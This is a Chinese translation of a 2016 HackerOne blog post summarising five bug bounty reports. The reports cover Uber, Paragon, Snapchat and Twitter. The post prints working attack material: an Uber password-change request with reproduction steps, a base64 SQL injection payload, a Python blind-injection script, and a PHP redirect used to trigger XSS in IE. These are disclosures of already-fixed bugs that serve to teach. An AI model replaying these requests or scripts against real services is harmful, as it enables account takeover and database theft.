# 【技术分享】HackerOne第三季度TOP 5 漏洞报告

阅读量 **137472**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2016-10-31 10:12:47

 **x**

##### 译文声明

本文是翻译文章，文章来源：hackerone

原文地址：<https://hackerone.com/blog/top-vulnerability-reports-of-3Q-2016>

译文仅供参考，具体内容表达以及含义原文为准。

**翻译：**[ **sinensis**
****](http://bobao.360.cn/member/contribute?uid=2642794559)

**稿费：170RMB（不服你也来投稿啊！）  
**

**投稿方式：发送邮件至linwei#360.cn，或登陆[
**网页版**](http://bobao.360.cn/contribute/index)在线投稿**

**  
**

**前言**

HackerOne第三季度TOP 5 漏洞报告即将揭晓。

在这一季中，我们参加了Vegas黑客大会，主办了[Hacked the World](https://hackerone.com/blog/hack-the-world)，并在[Reddit](https://www.reddit.com/r/IAmA/comments/4zj3oy/we_are_hackerone_and_help_hackers_to_hack/)的上面讨论了一些HackerOne的问题。HackerOne的漏洞报告者从平台建立累计拿到超过$10,000,000奖励，最重要的一点:
他们帮助了很多公司找到了以下重量级漏洞。  

这五个漏洞不是粗略评估列出来的，而是经过认真评估，以确保内容没有重复，又不是简单的漏洞总结。详细的漏洞是最具指导性，这也是我们发布出来的原因。  

**  
**

**漏洞详情**

一、
[Mongo](https://hackerone.com/mongo)在审查Uber的[无密码注册机制](https://hackerone.com/reports/143717)的时候发现一个漏洞。然后Uber在一天之内修复好，并且在mongo确认修复之后，他得到了10,000美金。Uber对mongo表示万分感谢，我们非常高兴在HackerOne能有Mongo这样的人。

Mongo发现的漏洞如下：  

通过/rt/users/passwordless-signup可以改变任何Uber用户的密码，给出任何一个受害者的手机号码（或者通过暴力列举电话号码，找出已经注册用户的手机号）。

Mongo使用了自己的手机号做了以下测试:

    
    
    POST /rt/users/passwordless-signup HTTP/1.1
    Host: cn-geo1.uber.com
    User-Agent: client/iphone/2.137.1
    Connection: close
    Content-Type: application/json
    Content-Length: 197
    {"phoneNumberE164":"+xxxxxxxx","userWorkflow":"PASSWORDLESS_SIGNUP","userRole":"client","mobileCountryISO2":"XX","state":"CREATE_NEW_PASSWORD","newPasswordData":{"newPassword":"12345678911a!"}}

HTTP响应报文如下：

    
    
    {"phoneNumberE164":"+xxxxxxxx","serverState":"SUCCEEDED","serverStateData":{"nextState":"SIGN_IN"},"tripVerifyStateData":{},"userMessage":"New password has been created. Please login with the new Password.","userRole":"client","userWorkflow":"PASSWORDLESS_SIGNUP"}

测试步骤:

1.先注册一个乘客账号（IOS或者安卓客户端都可以）

2.对如上所示的链接发起POST请求，其中的phoneNumberE164字段就是你想修改的手机号（加上手机的区号，比如+1xxx是美国），可能需要重复两次请求，最终得到回应:
"New password has been created"，此时这个手机号的密码已经改变，就是POST提交时候的newPassword字段。

3.使用新的密码在<http://riders.uber.com>登录或者其他设备。

  

二、在这博客的一系列报告中，只有[orange](https://www.hackerone.com/orange)知道让旅行的收益最大化。在中国的这个[案例](https://hackerone.com/reports/150156)中，当orange取消订阅的时候，发现Uber的.cn域名存在SQL
Injection漏洞，这个漏洞报告赢得了$4,000美金。

Orange发现的漏洞如下：

当orange在中国旅游使用Uber的时候，有一次他收到一份Uber的广告，并且里面有一个退订链接，但是他发现退订的连接和原来的退订链接不同，

并且这个退订连接存在SQL Injection。

Payload如下：

    
    
    http://sctrack.email.uber.com.cn/track/unsubscribe.do?p=eyJ1c2VyX2lkIjogIjU3NTUgYW5kIHNsZWVwKDEyKT0xIiwgInJlY2VpdmVyIjogIm9yYW5nZUBteW1haWwifQ==

上面这个链接让数据库sleep了12秒。p参数后面是base64，解码如下:

    
    
    http://sctrack.email.uber.com.cn/track/unsubscribe.do?p={"user_id": "5755 and sleep(12)=1", "receiver": "orange@mymail"}

然后orange写了一个盲注脚本得到数据库名字和数据库用户:

    
    
    import json
    import string
    import requests
    from urllib import quote
    from base64 import b64encode
    base = string.digits + '_-@.'
    payload = {"user_id": 5755, "receiver": "blog.orange.tw"}
    for l in range(0, 30):
        for i in 'i'+base:
            payload['user_id'] = "5755 and mid(user(),%d,1)='%c'#"%(l+1, i)
            new_payload = json.dumps(payload)
            new_payload = b64encode(new_payload)
            r = requests.get('http://sctrack.email.uber.com.cn/track/unsubscribe.do?p='+quote(new_payload))
            if len(r.content)>0:
                print i,
                break

最终得到mysql的用户名 sendcloud_w@10.9.79.210，数据库sedncloud。

  

三、[Paragonie_Scott](https://hackerone.com/paragonie-scott)是HackerOne里面比较出众的队伍，在分析这篇[奇特的.svg](https://hackerone.com/reports/148853)报告的时候，提醒我们.svg的与众不同。与其他图片格式相比，巧妙的.svg代码构造可以执行。[Adbullah](https://hackerone.com/abdullah)收到了[Paragon](https://hackerone.com/paragonie)项目有史以来最丰厚的奖励，更不用说3500次页面访问。  

漏洞如下：  

前提：浏览器处理SVG文件的方式非常烂，如果你要处理用户上传的SVG文件，必须确保只允许用户使用的Content-Type为text/plain。

背景：

Adbullah在ubuntu设置airship的时候碰到点问题，所以他在Paragon上面测试了下。

如果你上传任何文件（HTML，SWF等）来触发XSS，最终Content-Type的值会变成"text/palin;charset=us-ascii"。对于图片来说也一样，但是如果上传的格式是SVG，但是里面的内容是JS，最终允许上传。

这样设置Content-Type，"Content-Type: images/svg+xml; charset=us-ascii"，攻击就可以成功，并且存储到用户的账户。

  

四、我们经常在黑客报告中看到这样的字眼"这个漏洞好像没什么。。。",真是太谦虚了。这个[控制http://fastly.sc-cdn.net子域名](https://hackerone.com/reports/154425)报告就是这样开始的。  
[Ebrietas](https://hackerone.com/ebrietas)从一个旧的DNS记录开始，最终获得了$3000奖金。非常感谢他的报告，避免了用户获取错误的信息。

漏洞如下：

我在一个cdn主机上面发了snapchat运行的一个测试实例，但是当这个主机取消的时候DNS记录仍然存在。所有我可以在上面重新创建一个Fastly实例来接管它。我已经通过Censys的记录确定这个snapchat所属。

最新发现这个主机仍然在被Snapchat使用。我在服务器上面发现了如下的日志：

    
    
    root@localhost:~# cat /var/log/apache2/access.log |  grep -v server-status | grep snapchat -i
    23.235.39.33 - - [02/Aug/2016:18:28:25 +0000] "GET /bq/story_blob?story_id=fRaYutXlQBosonUmKavo1uA&t=2&mt=0 HTTP/1.1" 404 453 "-" "Snapchat/9.21.1.1 (iPad2,5; iOS 9.1; gzip)"
    23.235.39.43 - - [02/Aug/2016:18:28:25 +0000] "GET /bq/story_blob?story_id=f3gHI7yhW-Q7TeACCzc2nKQ&t=2&mt=0 HTTP/1.1" 404 453 "-" "Snapchat/9.21.1.1 (iPad2,5; iOS 9.1; gzip)"
    23.235.46.45 - - [03/Aug/2016:02:40:48 +0000] "GET /bq/story_blob?story_id=fKGG6u9zG4juOFT7-k0PNWw&t=2&mt=1&encoding=compressed HTTP/1.1" 404 453 "-" "Snapchat/9.21.1.0 (Nexus 7; Android 5.1.1#1836172#22; gzip)"
    23.235.46.23 - - [03/Aug/2016:02:40:49 +0000] "GET /bq/story_blob?story_id=fco3gXZkbBCyGc_Ym8UhK2g&t=2&mt=1&encoding=compressed HTTP/1.1" 404 453 "-" "Snapchat/9.21.1.0 (Nexus 7; Android 5.1.1#1836172#22; gzip)"
    43.249.75.20 - - [03/Aug/2016:12:39:03 +0000] "GET /discover/dsnaps?edition_id=4527366714425344&dsnap_id=5651565881327616&hash=66e61fa7787383c08a76a131e96915eec2d8b3019a3a96af66496003c9a9b1c1&publisher=Refinery29&quality=android_med9to16-android_med9to16 HTTP/1.1" 404 455 "-" "Snapchat/9.21.1.0 (GT-I9300; Android 4.3#I9300XWUGML4#18; gzip)"
    43.249.75.24 - - [03/Aug/2016:12:39:03 +0000] "GET /bq/story_blob?story_id=ftzqLQky4KJ_B6Jebus2Paw&t=2&mt=1&encoding=compressed HTTP/1.1" 404 453 "-" "Snapchat/9.21.1.0 (GT-I9300; Android 4.3#I9300XWUGML4#18; gzip)"
    43.249.75.22 - - [03/Aug/2016:12:39:03 +0000] "GET /bq/story_blob?story_id=fEXbJ2SDn3Os8m4aeXs-7Cg&t=2&mt=0 HTTP/1.1" 404 453 "-" "Snapchat/9.21.1.0 (GT-I9300; Android 4.3#I9300XWUGML4#18; gzip)"
    23.235.46.21 - - [03/Aug/2016:14:46:18 +0000] "GET /bq/story_blob?story_id=fu8jKJ_5yF71_WEDi8eiMuQ&t=1&mt=1&encoding=compressed HTTP/1.1" 404 453 "-" "Snapchat/9.21.1.1 (iPhone5,2; iOS 9.2; gzip)"
    23.235.46.28 - - [03/Aug/2016:14:46:19 +0000] "GET /bq/story_blob?story_id=flWVBXvBXToy-vhsBdze11g&t=1&mt=1&encoding=compressed HTTP/1.1" 404 453 "-" "Snapchat/9.21.1.1 (iPhone5,2; iOS 9.2; gzip)"
    23.235.44.35 - - [04/Aug/2016:05:57:37 +0000] "GET /bq/story_blob?story_id=fuZO-2ouGdvbCSggKAWGTaw&t=0&mt=1&encoding=compressed HTTP/1.1" 404 453 "-" "Snapchat/9.21.1.0 (SAMSUNG-SGH-I537; Android 5.0.1#I537UCUCOC7#21; gzip)"
    23.235.44.46 - - [04/Aug/2016:05:57:37 +0000] "GET /bq/story_blob?story_id=fa3DTt_mL0MhekUS9ZXg49A&t=0&mt=1&encoding=compressed HTTP/1.1" 404 453 "-" "Snapchat/9.21.1.0 (SAMSUNG-SGH-I537; Android 5.0.1#I537UCUCOC7#21; gzip)"
    185.31.18.21 - - [04/Aug/2016:19:50:01 +0000] "GET /bq/story_blob?story_id=fDL270uTcFhyzlRENPVPXnQ&t=0&mt=1&encoding=compressed HTTP/1.1" 404 453 "-" "Snapchat/9.21.1.1 (iPhone7,1; iOS 9.3.2; gzip)"

这样看起来我可以添加任何内容，不管是哪个app在使用。

  

五、埃及的[secgeek](https://hackerone.com/secgeek)向twitter反馈了这个漏洞：[sms-be-vip.twitter.com上存在HTML注入并且可能有XSS漏洞](https://hackerone.com/reports/150179)。这个漏洞影响到了最新版的IE浏览器（IE
11），它会导致html标签注入和JavaScript执行。在HackerOne，我们尤其欣赏专业和求同存异，最终这个漏洞获得了$420奖金。

漏洞如下：

在sms-be-vip.twitter.cm的404页面好像存在XSS和HTML注入，因为他并没有对HTML标签进行编码，比如<a
href="https://sms-be-vip.twitter.com/

# TEST

。” _src=”https://sms-be-vip.twitter.com/

# TEST

。”>https://sms-be-vip.twitter.com/<h1>TEST</h1>。

要触发这个漏洞，必须要确定URL不会编码之后发送，但是一般浏览器都会对URL进行编码。然而在最新的IE11或者更低版本的IE浏览器里面，这是可以做到的。

如何在使IE11在发送的时候不对URL进行编码处理呢？

在302跳转的时候IE不会对URL进行编码，所以我们可以写一个中转脚本：

    
    
    <?php
    $url = $_GET['x'];
    header("Location: $url");
    ?>

然后使用如上的脚本对存在XSS的地方发起请求。

    
    
    http://secgeek.net/POC/redir.php?x=https://sms-be-vip.twitter.com/<h1>TEST</h1>

现在你就会在IE浏览器里面看到HTTP的错误信息，而不是在错误页面看到<h1>TEST</h1>

微软的HTTP错误信息会在满足下面两个条件的时候出现：

1\. HTTP的状态必须是[400, 403, 404, 405, 406, 408, 409, 410, 500, 501, 505]

2\. HTTP的应答长度小于预定值，对于404来说这个数值是512字节。

所以我在后面添加更多的数据来避免上面的问题：

    
    
    http://secgeek.net/POC/redir.php?x=https://sms-bevip.twitter.com/<h1>TEST</h1>....................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................

这个漏洞允许恶意攻击者插入HTML标签，执行JS，最终可能导致用户session泄露，发起CSRF攻击或者引入一个钓鱼网站。

如果你觉得某个漏洞具有引导性或者非常棒，可以在[Hacktivity](https://hackerone.com/hacktivity/popular)页面[点赞
](https://hackerone.com/blog/hacktivity-upvoting)。

这个漏洞允许恶意攻击者插入HTML标签，执行JS，最终可能导致用户session泄露，发起CSRF攻击或者引入一个钓鱼网站。

  

**后记**

想在下一季中出现么？上传你的漏洞报告或[邀请你的黑客团队](https://hackerone.com/teams/new)，就像上面这些公司一样。就像我曾经读过的[博客](https://hackerone.com/blog/Bug-bounty-programs-taking-off)，每个团队都需要一个赏金项目。

[Rejesh F. Krishnan](https://twitter.com/rfkrishnan)

本文翻译自hackerone [原文链接](https://hackerone.com/blog/top-vulnerability-reports-of-3Q-2016)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **sinensis** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/84817](/post/id/84817)

安全客 - 有思想的安全新媒体

本文转载自: [hackerone](https://hackerone.com/blog/top-vulnerability-reports-of-3Q-2016)

如若转载,请注明出处： <https://hackerone.com/blog/top-vulnerability-reports-of-3Q-2016>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [安全知识](/tag/安全知识)

 **+1** __0赞

 __收藏

![](https://p3.ssl.qhmsg.com/dm/200_200_100/t00df551a583a87f4e9.jpg) sinensis

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

